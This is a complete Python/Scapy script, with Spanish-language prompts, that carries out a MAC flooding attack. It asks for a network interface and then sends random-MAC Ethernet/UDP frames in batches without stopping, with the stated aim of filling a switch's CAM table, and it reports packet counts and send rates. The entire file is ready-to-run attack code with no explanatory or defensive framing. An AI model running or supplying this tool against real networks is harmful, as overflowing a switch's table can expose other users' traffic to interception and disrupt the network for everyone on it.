#!/usr/bin/env python3

#########################################################
# Ataque:  MAC Flooding
# Autor:   Luiggy Encarnacion
#########################################################

from scapy.all import *

import random
import sys
import time
import signal

BATCH_SIZE = 50

stats = {
    "count"     : 0,
    "start_time": None
}

# ─────────────────────────────────────────
def banner(title):
    width = 40
    print()
    print("  ╔" + "═" * width + "╗")
    print("  ║" + title.center(width) + "║")
    print("  ╚" + "═" * width + "╝")

def separator():
    print("  " + "─" * 42)

# ─────────────────────────────────────────
def select_interface():
    try:
        from scapy.all import get_if_list
        interfaces = get_if_list()
    except Exception:
        interfaces = []

    if not interfaces:
        print("  [!] No se detectaron interfaces de red.")
        iface = input("  Ingrese el nombre de la interfaz manualmente: ").strip()
        return iface

    print()
    print("  Interfaces de red disponibles:")
    for i, iface in enumerate(interfaces, 1):
        print(f"    [{i}] {iface}")
    print()

    while True:
        seleccion = input("  Seleccione interfaz (número o nombre): ").strip()
        if seleccion.isdigit():
            idx = int(seleccion) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
            else:
                print("  [!] Número fuera de rango. Intente de nuevo.")
        elif seleccion in interfaces:
            return seleccion
        else:
            print("  [!] Interfaz no válida. Intente de nuevo.")

def solicitar_parametros():
    banner("MAC Flooding Attack")
    print()

    try:
        iface = select_interface()
        print()
    except KeyboardInterrupt:
        print()
        print("  [!] Saliendo.")
        sys.exit(0)

    return iface

# ─────────────────────────────────────────
def random_mac():
    return ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))

def build_packet():
    return (
        Ether(src=random_mac(), dst=random_mac()) /
        IP(src=f"{random.randint(1,254)}.{random.randint(1,254)}."
               f"{random.randint(1,254)}.{random.randint(1,254)}",
           dst=f"{random.randint(1,254)}.{random.randint(1,254)}."
               f"{random.randint(1,254)}.{random.randint(1,254)}") /
        UDP(sport=random.randint(1024,65535),
            dport=random.randint(1024,65535))
    )

# ─────────────────────────────────────────
def print_summary(sig=None, frame=None):
    elapsed    = max(int(time.time() - stats["start_time"]), 1)
    mins, secs = divmod(elapsed, 60)
    avg        = stats["count"] // elapsed

    print()
    banner("Resumen Final")
    print(f"  Paquetes enviados : {stats['count']}")
    print(f"  Rate promedio     : {avg} pkt/s")
    print(f"  Tiempo activo     : {mins:02d}:{secs:02d}")
    separator()
    print("  [+] Saliendo.")
    print()
    sys.exit(0)

# ─────────────────────────────────────────
def mac_flooding(iface):
    while True:
        batch = [build_packet() for _ in range(BATCH_SIZE)]
        sendp(batch, iface=iface, verbose=False, inter=0)
        stats["count"] += BATCH_SIZE

        # Mostrar progreso cada 500 paquetes
        if stats["count"] % 500 == 0:
            elapsed    = int(time.time() - stats["start_time"])
            mins, secs = divmod(elapsed, 60)
            print(f"  {mins:02d}:{secs:02d}   {stats['count']:>8,} pkt enviados")

# ─────────────────────────────────────────
def main():
    # Primero recopilar parámetros — sin signal handlers activos todavía
    IFACE = solicitar_parametros()

    # Registrar el handler DESPUÉS de que el usuario haya ingresado los datos
    # y DESPUÉS de inicializar start_time, para evitar el crash con None
    stats["start_time"] = time.time()
    signal.signal(signal.SIGINT, print_summary)

    banner("MAC Flooding Attack")
    print(f"  Interfaz  : {IFACE}")
    print(f"  Batch     : {BATCH_SIZE} pkt/envío")
    separator()
    print(f"  [*] Llenando CAM Table del switch...")
    print(f"  [*] Generando MACs aleatorias...")
    print()

    print(f"  {'Tiempo':^8} {'Progreso'}")
    separator()

    mac_flooding(IFACE)

if __name__ == "__main__":
    main()
